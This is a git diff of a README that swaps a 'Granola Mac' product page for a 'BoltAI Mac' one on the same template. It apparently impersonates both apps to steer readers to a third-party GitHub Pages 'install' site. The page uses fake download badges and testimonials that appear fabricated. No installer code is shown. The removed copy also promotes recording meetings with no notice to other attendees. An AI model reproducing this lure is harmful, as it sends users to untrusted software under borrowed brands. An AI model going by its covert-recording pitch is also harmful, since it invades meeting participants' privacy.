@@ -1,117 +1,117 @@
-# Granola Mac
+# BoltAI Mac
 
 <p align="center">
-  <img src="https://www.granola.ai/icon.png" width="150" alt="Granola icon"/>
+  <img src="https://store.setapp.com/cdn-cgi/image/width=384,quality=75,format=auto/app/1816/46211/icon-1776010876-69dbc67c05a58.png" width="150" alt="BoltAI icon"/>
 </p>
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://universal-application.github.io/.github/granola)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://universal-application.github.io/.github/boltAI)
 
 </div>
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/Downloads-6.5k-brightgreen?style=flat"/></a>
-  <a href="#"><img src="https://img.shields.io/badge/Version-2.3-blue?style=flat"/></a>
+  <a href="#"><img src="https://img.shields.io/badge/Downloads-8.7k-brightgreen?style=flat"/></a>
+  <a href="#"><img src="https://img.shields.io/badge/Version-1.9-blue?style=flat"/></a>
   <a href="#"><img src="https://img.shields.io/badge/Platform-macOS-blue?style=flat"/></a>
 </p>
 
 ---
 
-## 💡 Overview
+## 📋 Overview
 
-<a href="#">Granola</a> takes a fundamentally different approach to meeting documentation than AI tools that replace human note-taking entirely: it enhances human notes with AI rather than substituting AI for human judgment about what matters. You write brief notes during the meeting — the points you find important — and Granola uses the audio to expand those notes into complete, structured documentation.
+<a href="#">BoltAI</a> brings AI model access to Mac as a native application rather than a collection of browser tabs, providing faster access, deeper system integration, and significantly more control over AI interactions than web-based interfaces offer to users who work with AI many times daily.
 
-The <a href="#">hybrid capture model</a> treats the notes you take as signal rather than as the final product. The items you write down during a meeting indicate priority — Granola uses them as anchors and builds full context from the audio around each anchor point. A bullet point that reads "Q3 target discussion" becomes a complete paragraph describing what was actually discussed about Q3 targets, grounded in the audio of that exchange. <a href="#">Local audio processing</a> captures meeting audio through your device without requiring a visible bot in the participant list — no recording notice appears to other attendees, no AI participant joins the call, and the tool works on any meeting platform without integration requirements.
+The <a href="#">multi-model connectivity</a> links to OpenAI GPT models, Anthropic Claude, Google Gemini, Mistral, Perplexity, and other providers through direct API connections using your own keys. Switch between models within the same conversation or route specific task types to the models that handle them best. <a href="#">System-wide keyboard shortcut</a> summons the AI panel from anywhere on the desktop without switching windows or opening a browser — two keystrokes from any application to AI access.
 
 <p align="center">
-  <img src="https://mintcdn.com/granola-c3940166/s_7aq8Inb_cmqYqW/help-center/assets/setup-guide/step-5.png?fit=max&auto=format&n=s_7aq8Inb_cmqYqW&q=85&s=925c55dda612f1ba3b7f8ea2c3d06cc7" alt="Granola screenshot"/>
+  <img src="https://boltai.com/assets/app-demo/app-screenshot-1.webp" alt="BoltAI screenshot"/>
 </p>
 
-<a href="#">Enhanced note output</a> transforms brief, cryptic notes into complete professional documentation with full grammatical sentences, appropriate context, and accurate detail from the audio content that surrounded each noted point. Notes that would read as private shorthand to anyone else become a shareable meeting record. <a href="#">Custom output templates</a> structure enhanced notes according to pre-defined formats — client meeting frameworks, project update templates, one-on-one structures — ensuring consistent documentation across the same meeting types without manual formatting.
+<a href="#">Inline text operations</a> apply AI assistance to selected content in any application without copy-pasting to a browser. Select text anywhere on the system, trigger BoltAI, and rewrite, summarize, translate, expand, or transform the selected content with results that replace or supplement the original. <a href="#">Custom AI personas</a> store system prompt configurations for recurring task types — a technical writing editor, a code reviewer, a legal summarizer — each with appropriate instructions and behavior applied automatically when selected rather than re-established each session.
 
-The <a href="#">no-bot architecture</a> resolves the social friction that AI recording bots introduce. Some clients ask questions about recording bots. Some colleagues notice and feel observed. Some meeting contexts — legal discussions, HR conversations, confidential negotiations — are inappropriate for visible AI recording. Granola operates invisibly because it processes audio locally on the device. <a href="#">Post-hoc audio processing</a> handles audio from meetings where Granola was not running during the call, processing recordings made through other means to enhance notes written after the fact.
+The <a href="#">prompt library</a> stores frequently used instructions for one-click application without retyping. Build a personal collection of prompts that match your recurring workflows and apply them instantly to any context. <a href="#">Persistent conversation history</a> archives all past interactions in a searchable store, making specific previous exchanges recoverable rather than requiring manual record-keeping of useful AI conversations.
 
 ---
 
 ## 🔧 Key Features
 
-- <a href="#">Hybrid capture</a> — your notes plus AI context
-- <a href="#">Local audio processing</a> — no bot in participant list
-- <a href="#">Enhanced output</a> — fragments to complete docs
-- <a href="#">Custom templates</a> — consistent meeting formats
-- <a href="#">Invisible operation</a> — no notice to other attendees
-- <a href="#">Post-hoc processing</a> — any audio file works
-- <a href="#">Any platform</a> — Zoom Meet Teams phone any
-- <a href="#">Note anchoring</a> — your priorities drive output
+- <a href="#">Multi-model access</a> — GPT Claude Gemini Mistral
+- <a href="#">Own API keys</a> — any provider direct connection
+- <a href="#">System-wide shortcut</a> — AI from any application
+- <a href="#">Inline text operations</a> — rewrite summarize translate
+- <a href="#">Custom personas</a> — saved instruction configurations
+- <a href="#">Prompt library</a> — one-click recurring prompts
+- <a href="#">Conversation archive</a> — searchable history persistent
+- <a href="#">Native desktop</a> — not a browser tab
 
 ---
 
-## 🙋 Who Uses It
+## 🧑‍💻 Who Uses It
 
-- **Client-facing consultants** — professional meeting docs without the awkwardness of visible recording bots
-- **Team managers** — complete one-on-one and team meeting records grounded in what was said
-- **Sales professionals** — client conversation documentation without recording friction or CRM manual entry
-- **Executives** — comprehensive meeting records across a high-volume calendar without bot presence
+- **Developers** — inline code help documentation and review without leaving the editor
+- **Writers** — AI editing rewriting and drafting within any text application directly
+- **Researchers** — multi-model comparison for evaluating response quality across providers
+- **Analysts** — summarize extract and transform documents without browser context switching
 
 ---
 
 <p align="center">
-  <img src="https://techcrunch.com/wp-content/uploads/2024/05/Screenshot-full.png" alt="Granola screenshot 2"/>
+  <img src="https://assets.tina.io/f400d381-a33d-44d8-b286-db5a8f571b42/v1.3/boltai-setup-perplexity.jpg" alt="BoltAI screenshot 2"/>
 </p>
 
-## 🏢 Where It's Useful & Additional Information
+## 🌍 Where It's Useful & Additional Information
 
-`Client consultations` · `Management one-on-ones` · `Sales discovery calls` · `Project reviews` · `Board meetings` · `Strategy sessions` · `Investor discussions` · `Team standups` · `User research` · `Coaching sessions`
+`Software development` · `Technical writing` · `Content creation` · `Research workflows` · `Legal document review` · `Data analysis` · `Customer communication` · `Code review` · `Translation` · `Email drafting`
 
-Granola's design is built around a specific observation about where AI assistance adds the most value in meeting documentation: not in replacing the human's judgment about what matters, but in removing the effort required to turn that judgment into complete documentation. A participant who writes five bullet points during a meeting has already done the hard cognitive work — they have identified what is worth remembering. Granola handles the mechanical work of expanding those five points into a complete record, which is where the time and effort actually go in post-meeting documentation, not in the initial identification of what matters.
+BoltAI's value is most apparent for users who have spent months using AI through browser tabs and accumulate the friction of that workflow daily. The constant context-switching between work application and browser, the conversation history that disappears when tabs close, the inability to apply AI to selected text without a copy-paste round trip — these small frictions compound across dozens of daily interactions into significant time lost. BoltAI removes all three simultaneously. The system-wide shortcut transforms AI access from a deliberate tool launch into a reflex that adds two keystrokes to any task that benefits from AI assistance.
 
-> *"No bot in the meeting was the deciding factor for me. I have client calls where introducing a recording participant would change the dynamic or create concerns. Granola solves the documentation problem without creating a new one."* — Felix B., Management Consultant
+> *"Using AI through browser tabs for a year, then switching to BoltAI. The keyboard shortcut access changed my daily workflow more than any other tool I have adopted. AI assistance went from deliberate to reflexive."* — Nina K., Technical Writer
 
-> *"The enhanced output is qualitatively different from what I produce manually. My handwritten notes become complete professional documentation. The time I used to spend writing up meeting notes is essentially recovered."* — Claudia M., Strategy Director
+> *"Custom personas are where the daily value lives. I have a code reviewer with our standards built in, a copyeditor for my writing style, and a research assistant. Each opens with the right context already configured."* — Felix W., Senior Product Manager
 
 ---
 
-## ⬇️ Installation Instructions
+## 📦 Installation Instructions
 
 1. Go to the installation site using the button above.
-2. Follow the on-screen instructions to install **Granola** on your Device.
+2. Follow the on-screen instructions to install **BoltAI** on your Device.
 
 <p align="center">
 
-[![Get it Now Granola](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://universal-application.github.io/.github/granola)
+[![Get it Now BoltAI](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://universal-application.github.io/.github/boltAI)
 
 </p>
 
 ---
 
-## 📌 FAQ
+## 💬 FAQ
 
 <details>
-<summary>Does Granola require a bot to join the meeting?</summary>
+<summary>Which AI providers does BoltAI support?</summary>
 
-No. Granola captures audio locally through your device without joining the meeting as a visible participant. Other attendees see a normal meeting without any AI participant or recording notification.
+OpenAI GPT models, Anthropic Claude, Google Gemini, Mistral, Perplexity, and any other provider accessible through a compatible API. Add providers by entering your own API key for each service.
 
 </details>
 
 <details>
-<summary>Which meeting platforms does Granola work with?</summary>
+<summary>Does BoltAI store conversation data externally?</summary>
 
-Granola processes audio from any meeting on your device — Zoom, Google Meet, Teams, phone calls through a headset, and in-person meetings captured through your microphone. It is not limited to specific platforms.
-
-</details>
-
-<details>
-<summary>How much do I need to type during the meeting?</summary>
-
-Write as much or as little as feels natural. Even a few words or brief bullets provide enough for Granola to anchor the enhancement. More detailed notes produce more precisely targeted output.
+No. Conversations store locally on your device. API requests go directly from BoltAI to the selected provider — no BoltAI server sits in the data path between your device and the AI model.
 
 </details>
 
 <details>
-<summary>Is the audio sent to external servers?</summary>
+<summary>Can BoltAI be used without a paid AI subscription?</summary>
 
-No. Audio processing happens locally on your device. Meeting audio does not upload to Granola's or any other external server by default.
+BoltAI requires at least one API key from an AI provider. Most major providers offer free usage tiers that cover moderate interaction volume at no cost before paid usage begins.
+
+</details>
+
+<details>
+<summary>Does inline AI work across all applications?</summary>
+
+Yes. The system-wide shortcut and selected text processing function in any application that supports standard text selection on macOS, regardless of the specific application.
 
 </details>
 
